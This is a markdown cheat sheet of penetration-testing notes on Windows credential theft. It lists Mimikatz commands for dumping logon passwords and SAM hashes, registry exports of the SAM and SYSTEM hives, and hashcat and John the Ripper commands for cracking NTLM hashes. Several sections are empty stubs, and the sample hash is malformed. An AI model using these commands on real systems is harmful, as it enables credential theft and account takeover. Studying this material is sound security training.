## Passwords

- [Passwords](#passwords)
- [Mimikatz](#mimikatz)
    - [Mimikatz LSADump::SAM](#mimikatz-lsadumpsam)
    - [Mimikatz Pass The Hash](#mimikatz-pass-the-hash)
  - [Responder](#responder)
  - [Password cracking](#password-cracking)
    - [OnlineHashCrack.com](#onlinehashcrackcom)
    - [Cain and abel](#cain-and-abel)
    - [John the Ripper](#john-the-ripper)
    - [HashCat](#hashcat)
    - [THC Hydra](#thc-hydra)
    - [Aircrack-ng](#aircrack-ng)
    - [L0phtcrack and ophcrack](#l0phtcrack-and-ophcrack)
    - [Dictionary Attack](#dictionary-attack)
    - [Spidering :](#spidering-)
    - [Hybrid attacks eg James1](#hybrid-attacks-eg-james1)
    - [Pass The Hash PtH](#pass-the-hash-pth)

## Mimikatz

```bash
# elevate
privilege::debug
# elevate
token::elevate
# log
log 
# or log to named file
log mimikatz.log
# dump passwords
sekurlsa::logonpasswords 
sekurlsa::logonpasswords full
# get hashes
dpapi::cache //load
# get keys
sekurlsa::ekeys
```

#### Mimikatz LSADump::SAM

Get All Hashes From System

```bash
# Export Registry (Powershell)
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
# Mimikatz elevate
privilege::debug
token::elevate
# Mimikatz dump LSA hashes
cd c:\path\to\mimikatz\executable
log hash.txt
lsadump::sam sam.hiv system.hiv
```

Now edit the file so the data is in this format  username:NTLMHash

  Philip:0aca9df100f9bc3a68a50fda1812636g

Copy this file to HashCat and run the command

```bash
hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst 
```

and any password matches will show up.

#### Mimikatz Pass The Hash

We can now use these credentials to log into a domain!

cal

### Responder

Obtains the hash over the network


### Password cracking

#### OnlineHashCrack.com

https://www.onlinehashcrack.com

#### Cain and abel

#### John the Ripper

John The Ripper : use to find a password from a hash

```bash
john --format=nt hash.txt
```

#### HashCat

```bash
hashcat -m 1000 -a 3 hash.txt
```

#### THC Hydra

#### Aircrack-ng

#### L0phtcrack and ophcrack

#### Dictionary Attack

       splashdata.com

       Daniel Miessler github
       
#### Spidering : 

search in plain text all files on computer, then use these to try as passwords
       
#### Hybrid attacks eg James1

#### Pass The Hash PtH

if hash is obtained, submit it directly

       Combat this -  should only log on to DC with domain admin
                            credentials, also
                            Restricted Admin mode restricts where domain admin
                                          credentials can be used
                                          
Note : live system : might be possible to obtain from memory (RAM)
